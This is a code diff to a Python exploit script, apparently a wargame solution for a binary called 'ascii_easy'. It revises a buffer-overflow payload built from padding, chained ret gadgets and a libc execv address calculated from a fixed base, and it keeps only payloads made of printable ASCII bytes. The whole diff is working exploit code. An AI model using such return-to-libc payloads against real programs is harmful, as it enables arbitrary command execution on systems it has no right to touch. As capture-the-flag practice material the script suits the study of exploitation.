@@ -27,16 +27,21 @@ def is_ascii(payload):
 	return True
 
 base_addr = 0x5555e000
-execv = p32(0x55616740) # execv: int execv(const char *path, char *const argv[]);
+ret       = 0x89c55  + base_addr
+execv     = 0xb8740  + base_addr # execv: int execv(const char *path, char *const argv[]);
+N         = 0x165a40 + base_addr
 
-lib = ELF('./libc-2.15.so')
-bin = ELF('./ascii_easy')
+#lib = ELF('./libc-2.15.so')
+#bin = ELF('./ascii_easy')
 
 pad = 'A' * 28 + 'B' * 4
-pad = repeat_to_length('sh;', 32)
+#pad = repeat_to_length('sh;', 32)
 
-payload  = execv
-payload += '!'
+payload  = p32(ret)
+payload += p32(ret)
+payload += p32(execv)
+payload += 'A' * 4
+payload += p32(N)
 
 if is_ascii(payload):
 	sys.stdout.write(pad + payload)
